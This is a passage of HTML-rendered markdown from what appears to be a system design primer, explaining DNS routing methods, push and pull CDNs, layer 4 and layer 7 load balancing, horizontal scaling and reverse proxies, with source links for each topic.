&lt;p&gt;Services such as &lt;a href="https://www.cloudflare.com/dns/" rel="nofollow"&gt;CloudFlare&lt;/a&gt; and &lt;a href="https://aws.amazon.com/route53/" rel="nofollow"&gt;Route 53&lt;/a&gt; provide managed DNS services.  Some DNS services can route traffic through various methods:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.g33kinfo.com/info/round-robin-vs-weighted-round-robin-lb" rel="nofollow"&gt;Weighted round robin&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;Prevent traffic from going to servers under maintenance&lt;/li&gt;
&lt;li&gt;Balance between varying cluster sizes&lt;/li&gt;
&lt;li&gt;A/B testing&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Latency-based&lt;/li&gt;
&lt;li&gt;Geolocation-based&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-disadvantages-dns" class="anchor" aria-hidden="true" href="#disadvantages-dns"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): DNS&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Accessing a DNS server introduces a slight delay, although mitigated by caching described above.&lt;/li&gt;
&lt;li&gt;DNS server management could be complex and is generally managed by &lt;a href="http://superuser.com/questions/472695/who-controls-the-dns-servers/472729" rel="nofollow"&gt;governments, ISPs, and large companies&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;DNS services have recently come under &lt;a href="http://dyn.com/blog/dyn-analysis-summary-of-friday-october-21-attack/" rel="nofollow"&gt;DDoS attack&lt;/a&gt;, preventing users from accessing websites such as Twitter without knowing Twitter's IP address(es).&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-sources-and-further-reading-5" class="anchor" aria-hidden="true" href="#sources-and-further-reading-5"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://technet.microsoft.com/en-us/library/dd197427(v=ws.10).aspx" rel="nofollow"&gt;DNS architecture&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Domain_Name_System" rel="nofollow"&gt;Wikipedia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://support.dnsimple.com/categories/dns/" rel="nofollow"&gt;DNS articles&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-content-delivery-network" class="anchor" aria-hidden="true" href="#content-delivery-network"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Content delivery network&lt;/h2&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/853a8603651149c686bf3c504769fc594ff08849/687474703a2f2f692e696d6775722e636f6d2f683954417547492e6a7067"&gt;&lt;img src="https://camo.githubusercontent.com/853a8603651149c686bf3c504769fc594ff08849/687474703a2f2f692e696d6775722e636f6d2f683954417547492e6a7067" data-canonical-src="http://i.imgur.com/h9TAuGI.jpg" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="https://www.creative-artworks.eu/why-use-a-content-delivery-network-cdn/" rel="nofollow"&gt;Source: Why use a CDN&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;A content delivery network (CDN) is a globally distributed network of proxy servers, serving content from locations closer to the user.  Generally, static files such as HTML/CSS/JS, photos, and videos are served from CDN, although some CDNs such as Amazon's CloudFront support dynamic content.  The site's DNS resolution will tell clients which server to contact.&lt;/p&gt;
&lt;p&gt;Serving content from CDNs can significantly improve performance in two ways:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Users receive content at data centers close to them&lt;/li&gt;
&lt;li&gt;Your servers do not have to serve requests that the CDN fulfills&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-push-cdns" class="anchor" aria-hidden="true" href="#push-cdns"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Push CDNs&lt;/h3&gt;
&lt;p&gt;Push CDNs receive new content whenever changes occur on your server.  You take full responsibility for providing content, uploading directly to the CDN and rewriting URLs to point to the CDN.  You can configure when content expires and when it is updated.  Content is uploaded only when it is new or changed, minimizing traffic, but maximizing storage.&lt;/p&gt;
&lt;p&gt;Sites with a small amount of traffic or sites with content that isn't often updated work well with push CDNs.  Content is placed on the CDNs once, instead of being re-pulled at regular intervals.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-pull-cdns" class="anchor" aria-hidden="true" href="#pull-cdns"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Pull CDNs&lt;/h3&gt;
&lt;p&gt;Pull CDNs grab new content from your server when the first user requests the content.  You leave the content on your server and rewrite URLs to point to the CDN.  This results in a slower request until the content is cached on the CDN.&lt;/p&gt;
&lt;p&gt;A &lt;a href="https://en.wikipedia.org/wiki/Time_to_live" rel="nofollow"&gt;time-to-live (TTL)&lt;/a&gt; determines how long content is cached.  Pull CDNs minimize storage space on the CDN, but can create redundant traffic if files expire and are pulled before they have actually changed.&lt;/p&gt;
&lt;p&gt;Sites with heavy traffic work well with pull CDNs, as traffic is spread out more evenly with only recently-requested content remaining on the CDN.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-disadvantages-cdn" class="anchor" aria-hidden="true" href="#disadvantages-cdn"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): CDN&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CDN costs could be significant depending on traffic, although this should be weighed with additional costs you would incur not using a CDN.&lt;/li&gt;
&lt;li&gt;Content might be stale if it is updated before the TTL expires it.&lt;/li&gt;
&lt;li&gt;CDNs require changing URLs for static content to point to the CDN.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-sources-and-further-reading-6" class="anchor" aria-hidden="true" href="#sources-and-further-reading-6"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://figshare.com/articles/Globally_distributed_content_delivery/6605972" rel="nofollow"&gt;Globally distributed content delivery&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.travelblogadvice.com/technical/the-differences-between-push-and-pull-cdns/" rel="nofollow"&gt;The differences between push and pull CDNs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Content_delivery_network" rel="nofollow"&gt;Wikipedia&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-load-balancer" class="anchor" aria-hidden="true" href="#load-balancer"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Load balancer&lt;/h2&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/21caea3d7f67f451630012f657ae59a56709365c/687474703a2f2f692e696d6775722e636f6d2f6838316e39694b2e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/21caea3d7f67f451630012f657ae59a56709365c/687474703a2f2f692e696d6775722e636f6d2f6838316e39694b2e706e67" data-canonical-src="http://i.imgur.com/h81n9iK.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://horicky.blogspot.com/2010/10/scalable-system-design-patterns.html" rel="nofollow"&gt;Source: Scalable system design patterns&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;Load balancers distribute incoming client requests to computing resources such as application servers and databases.  In each case, the load balancer returns the response from the computing resource to the appropriate client.  Load balancers are effective at:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Preventing requests from going to unhealthy servers&lt;/li&gt;
&lt;li&gt;Preventing overloading resources&lt;/li&gt;
&lt;li&gt;Helping eliminate single points of failure&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Load balancers can be implemented with hardware (expensive) or with software such as HAProxy.&lt;/p&gt;
&lt;p&gt;Additional benefits include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;SSL termination&lt;/strong&gt; - Decrypt incoming requests and encrypt server responses so backend servers do not have to perform these potentially expensive operations
&lt;ul&gt;
&lt;li&gt;Removes the need to install &lt;a href="https://en.wikipedia.org/wiki/X.509" rel="nofollow"&gt;X.509 certificates&lt;/a&gt; on each server&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Session persistence&lt;/strong&gt; - Issue cookies and route a specific client's requests to same instance if the web apps do not keep track of sessions&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To protect against failures, it's common to set up multiple load balancers, either in &lt;a href="#active-passive"&gt;active-passive&lt;/a&gt; or &lt;a href="#active-active"&gt;active-active&lt;/a&gt; mode.&lt;/p&gt;
&lt;p&gt;Load balancers can route traffic based on various metrics, including:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Random&lt;/li&gt;
&lt;li&gt;Least loaded&lt;/li&gt;
&lt;li&gt;Session/cookies&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.g33kinfo.com/info/round-robin-vs-weighted-round-robin-lb" rel="nofollow"&gt;Round robin or weighted round robin&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#layer-4-load-balancing"&gt;Layer 4&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#layer-7-load-balancing"&gt;Layer 7&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-layer-4-load-balancing" class="anchor" aria-hidden="true" href="#layer-4-load-balancing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Layer 4 load balancing&lt;/h3&gt;
&lt;p&gt;Layer 4 load balancers look at info at the &lt;a href="#communication"&gt;transport layer&lt;/a&gt; to decide how to distribute requests.  Generally, this involves the source, destination IP addresses, and ports in the header, but not the contents of the packet.  Layer 4 load balancers forward network packets to and from the upstream server, performing &lt;a href="https://www.nginx.com/resources/glossary/layer-4-load-balancing/" rel="nofollow"&gt;Network Address Translation (NAT)&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-layer-7-load-balancing" class="anchor" aria-hidden="true" href="#layer-7-load-balancing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Layer 7 load balancing&lt;/h3&gt;
&lt;p&gt;Layer 7 load balancers look at the &lt;a href="#communication"&gt;application layer&lt;/a&gt; to decide how to distribute requests.  This can involve contents of the header, message, and cookies.  Layer 7 load balancers terminates network traffic, reads the message, makes a load-balancing decision, then opens a connection to the selected server.  For example, a layer 7 load balancer can direct video traffic to servers that host videos while directing more sensitive user billing traffic to security-hardened servers.&lt;/p&gt;
&lt;p&gt;At the cost of flexibility, layer 4 load balancing requires less time and computing resources than Layer 7, although the performance impact can be minimal on modern commodity hardware.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-horizontal-scaling" class="anchor" aria-hidden="true" href="#horizontal-scaling"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Horizontal scaling&lt;/h3&gt;
&lt;p&gt;Load balancers can also help with horizontal scaling, improving performance and availability.  Scaling out using commodity machines is more cost efficient and results in higher availability than scaling up a single server on more expensive hardware, called &lt;strong&gt;Vertical Scaling&lt;/strong&gt;.  It is also easier to hire for talent working on commodity hardware than it is for specialized enterprise systems.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-disadvantages-horizontal-scaling" class="anchor" aria-hidden="true" href="#disadvantages-horizontal-scaling"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): horizontal scaling&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Scaling horizontally introduces complexity and involves cloning servers
&lt;ul&gt;
&lt;li&gt;Servers should be stateless: they should not contain any user-related data like sessions or profile pictures&lt;/li&gt;
&lt;li&gt;Sessions can be stored in a centralized data store such as a &lt;a href="#database"&gt;database&lt;/a&gt; (SQL, NoSQL) or a persistent &lt;a href="#cache"&gt;cache&lt;/a&gt; (Redis, Memcached)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Downstream servers such as caches and databases need to handle more simultaneous connections as upstream servers scale out&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-disadvantages-load-balancer" class="anchor" aria-hidden="true" href="#disadvantages-load-balancer"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): load balancer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;The load balancer can become a performance bottleneck if it does not have enough resources or if it is not configured properly.&lt;/li&gt;
&lt;li&gt;Introducing a load balancer to help eliminate single points of failure results in increased complexity.&lt;/li&gt;
&lt;li&gt;A single load balancer is a single point of failure, configuring multiple load balancers further increases complexity.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-sources-and-further-reading-7" class="anchor" aria-hidden="true" href="#sources-and-further-reading-7"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.nginx.com/blog/inside-nginx-how-we-designed-for-performance-scale/" rel="nofollow"&gt;NGINX architecture&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.haproxy.org/download/1.2/doc/architecture.txt" rel="nofollow"&gt;HAProxy architecture guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.lecloud.net/post/7295452622/scalability-for-dummies-part-1-clones" rel="nofollow"&gt;Scalability&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Load_balancing_(computing)" rel="nofollow"&gt;Wikipedia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.nginx.com/resources/glossary/layer-4-load-balancing/" rel="nofollow"&gt;Layer 4 load balancing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.nginx.com/resources/glossary/layer-7-load-balancing/" rel="nofollow"&gt;Layer 7 load balancing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.aws.amazon.com/elasticloadbalancing/latest/classic/elb-listener-config.html" rel="nofollow"&gt;ELB listener config&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-reverse-proxy-web-server" class="anchor" aria-hidden="true" href="#reverse-proxy-web-server"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Reverse proxy (web server)&lt;/h2&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/e88216d0999853426f72b28e41223f43977d22b7/687474703a2f2f692e696d6775722e636f6d2f6e3431417a66662e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/e88216d0999853426f72b28e41223f43977d22b7/687474703a2f2f692e696d6775722e636f6d2f6e3431417a66662e706e67" data-canonical-src="http://i.imgur.com/n41Azff.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="https://upload.wikimedia.org/wikipedia/commons/6/67/Reverse_proxy_h2g2bob.svg" rel="nofollow"&gt;Source: Wikipedia&lt;/a&gt;&lt;/i&gt;
  &lt;br&gt;
&lt;/p&gt;
&lt;p&gt;A reverse proxy is a web server that centralizes internal services and provides unified interfaces to the public.  Requests from clients are forwarded to a server that can fulfill it before the reverse proxy returns the server's response to the client.&lt;/p&gt;
&lt;p&gt;Additional benefits include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Increased security&lt;/strong&gt; - Hide information about backend servers, blacklist IPs, limit number of connections per client&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Increased scalability and flexibility&lt;/strong&gt; - Clients only see the reverse proxy's IP, allowing you to scale servers or change their configuration&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SSL termination&lt;/strong&gt; - Decrypt incoming requests and encrypt server responses so backend servers do not have to perform these potentially expensive operations
&lt;ul&gt;
&lt;li&gt;Removes the need to install &lt;a href="https://en.wikipedia.org/wiki/X.509" rel="nofollow"&gt;X.509 certificates&lt;/a&gt; on each server&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Compression&lt;/strong&gt; - Compress server responses&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Caching&lt;/strong&gt; - Return the response for cached requests&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Static content&lt;/strong&gt; - Serve static content directly
&lt;ul&gt;
&lt;li&gt;HTML/CSS/JS&lt;/li&gt;
&lt;li&gt;Photos&lt;/li&gt;
&lt;li&gt;Videos&lt;/li&gt;
&lt;li&gt;Etc&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-load-balancer-vs-reverse-proxy" class="anchor" aria-hidden="true" href="#load-balancer-vs-reverse-proxy"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Load balancer vs reverse proxy&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Deploying a load balancer is useful when you have multiple servers.  Often, load balancers  route traffic to a set of servers serving the same function.&lt;/li&gt;
&lt;li&gt;Reverse proxies can be useful even with just one web server or application server, opening up the benefits described in the previous section.&lt;/li&gt;
&lt;li&gt;Solutions such as NGINX and HAProxy can support both layer 7 reverse proxying and load balancing.&lt;/li&gt;
&lt;/ul&gt;
